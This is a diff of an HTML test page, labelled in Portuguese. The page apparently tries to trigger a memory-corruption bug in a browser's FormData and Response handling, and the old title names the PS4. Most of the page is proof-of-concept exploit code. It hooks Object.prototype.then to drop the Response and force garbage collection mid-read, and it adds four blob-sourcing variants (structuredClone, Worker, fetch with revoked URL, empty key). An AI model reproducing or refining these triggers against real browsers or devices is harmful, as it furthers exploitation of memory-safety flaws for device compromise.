@@ -2,10 +2,14 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Consuming form data with empty blob (PS4)</title>
+<title>Teste Opcoes A B C D - FormDataConsumer</title>
 </head>
 <body>
-<button id="run">Rodar teste</button>
+<button id="btnA">Opcao A (structuredClone)</button>
+<button id="btnB">Opcao B (Worker postMessage)</button>
+<button id="btnC">Opcao C (fetch + revoke + blob)</button>
+<button id="btnD">Opcao D (FormData chave vazia)</button>
+<button id="btnAll">Rodar A, B, C e D</button>
 <pre id="log"></pre>
 <script>
 function gc() {
@@ -24,68 +28,138 @@ function log(msg) {
     document.getElementById('log').textContent += msg + '\n';
 }
 
-function sleep(ms) {
-    return new Promise(function(resolve) {
-        setTimeout(resolve, ms);
+function hookAndConsumeResponse(formData, label) {
+    var response = new Response(formData);
+    Object.prototype.__defineGetter__('then', function() {
+        response = null;
+        gc();
     });
-}
-
-function createBlobWithoutIDB() {
-    return new Promise(function(resolve) {
-        if (typeof fetch === 'function' && typeof URL !== 'undefined' && typeof URL.createObjectURL === 'function') {
-            var url = URL.createObjectURL(new Blob(['aa']));
-            fetch(url).then(function(resp) {
-                URL.revokeObjectURL(url);
-                gc();
-                return resp.blob();
-            }).then(function(blob) {
-                gc();
-                resolve(blob);
-            }).catch(function() {
-                gc();
-                resolve(new Blob(['aa']));
-            });
-        } else {
-            gc();
-            resolve(new Blob(['aa']));
-        }
-    });
-}
-
-function runOnce() {
-    return createBlobWithoutIDB().then(function(blob) {
-        return sleep(100).then(function() {
-            var formData = new FormData();
-            formData.append('a', blob);
-
-            var response = new Response(formData);
-            Object.prototype.__defineGetter__('then', function() {
-                response = null;
-                gc();
-            });
-
-            return response.arrayBuffer();
+    gc();
+    var p = response.arrayBuffer();
+    if (p && typeof p.catch === 'function') {
+        p.catch(function(err) {
+            log('[' + label + '] arrayBuffer catch: ' + (err && err.message ? err.message : err));
         });
-    });
+    }
 }
 
-document.getElementById('run').onclick = function() {
-    log('Iniciando...');
-    var chain = Promise.resolve();
-    for (var i = 0; i < 20; i++) {
-        (function(idx) {
-            chain = chain.then(function() {
-                return runOnce().then(function() {
-                    log('Iteracao ' + idx + ': concluida');
-                }, function(err) {
-                    log('Iteracao ' + idx + ': rejeitada (' + (err && err.message ? err.message : err) + ')');
-                });
-            });
-        })(i);
+function runOptionA() {
+    log('[A] iniciando structuredClone...');
+    try {
+        if (typeof structuredClone !== 'function') {
+            log('[A] structuredClone nao disponivel');
+            return;
+        }
+        for (var k = 0; k < 5; k++) {
+            var original = new Blob(['aa']);
+            var cloned = structuredClone(original);
+            original = null;
+            gc();
+            var fd = new FormData();
+            fd.append('a', cloned);
+            hookAndConsumeResponse(fd, 'A');
+        }
+        log('[A] concluido');
+    } catch (e) {
+        log('[A] erro: ' + e.name + ': ' + e.message);
     }
-    chain.catch(function(err) {
-        log('Erro geral: ' + (err && err.message ? err.message : err));
-    });
+}
+
+function runOptionB() {
+    log('[B] iniciando Worker postMessage...');
+    try {
+        if (typeof Worker === 'undefined' || typeof URL === 'undefined' || typeof URL.createObjectURL !== 'function') {
+            log('[B] Worker ou URL.createObjectURL nao disponivel');
+            return;
+        }
+        var src = [
+            'self.onmessage = function(e) {',
+            '    if (typeof gc === "function") gc();',
+            '    self.postMessage(e.data);',
+            '};'
+        ].join('\n');
+        var blobUrl = URL.createObjectURL(new Blob([src], { type: 'application/javascript' }));
+
+        for (var k = 0; k < 5; k++) {
+            (function(idx) {
+                var w = new Worker(blobUrl);
+                w.onmessage = function(e) {
+                    gc();
+                    try {
+                        var fd = new FormData();
+                        fd.append('a', e.data);
+                        hookAndConsumeResponse(fd, 'B#' + idx);
+                    } catch (err) {
+                        log('[B#' + idx + '] erro no onmessage: ' + err.name + ': ' + err.message);
+                    }
+                    w.terminate();
+                };
+                w.onerror = function(err) {
+                    log('[B#' + idx + '] worker error: ' + (err && err.message ? err.message : 'erro'));
+                };
+                w.postMessage(new Blob(['aa']));
+            })(k);
+        }
+        log('[B] mensagens enviadas');
+    } catch (e) {
+        log('[B] erro: ' + e.name + ': ' + e.message);
+    }
+}
+
+function runOptionC() {
+    log('[C] iniciando fetch + revokeObjectURL + resp.blob()...');
+    try {
+        if (typeof fetch !== 'function' || typeof URL === 'undefined' || typeof URL.createObjectURL !== 'function') {
+            log('[C] fetch ou URL.createObjectURL nao disponivel');
+            return;
+        }
+        for (var k = 0; k < 5; k++) {
+            (function(idx) {
+                var url = URL.createObjectURL(new Blob(['aa']));
+                fetch(url).then(function(resp) {
+                    URL.revokeObjectURL(url);
+                    gc();
+                    return resp.blob();
+                }).then(function(blob) {
+                    gc();
+                    var fd = new FormData();
+                    fd.append('a', blob);
+                    hookAndConsumeResponse(fd, 'C#' + idx);
+                }).catch(function(err) {
+                    log('[C#' + idx + '] fetch/blob catch: ' + (err && err.message ? err.message : err));
+                });
+            })(k);
+        }
+        log('[C] requisicoes disparadas');
+    } catch (e) {
+        log('[C] erro: ' + e.name + ': ' + e.message);
+    }
+}
+
+function runOptionD() {
+    log('[D] iniciando FormData com valor vazio...');
+    try {
+        for (var k = 0; k < 5; k++) {
+            var fd = new FormData();
+            fd.append('key', '');
+            hookAndConsumeResponse(fd, 'D');
+        }
+        log('[D] concluido');
+    } catch (e) {
+        log('[D] erro: ' + e.name + ': ' + e.message);
+    }
+}
+
+document.getElementById('btnA').onclick = runOptionA;
+document.getElementById('btnB').onclick = runOptionB;
+document.getElementById('btnC').onclick = runOptionC;
+document.getElementById('btnD').onclick = runOptionD;
+document.getElementById('btnAll').onclick = function() {
+    document.getElementById('log').textContent = '';
+    runOptionA();
+    runOptionB();
+    runOptionC();
+    runOptionD();
 };
 </script>
 </body>
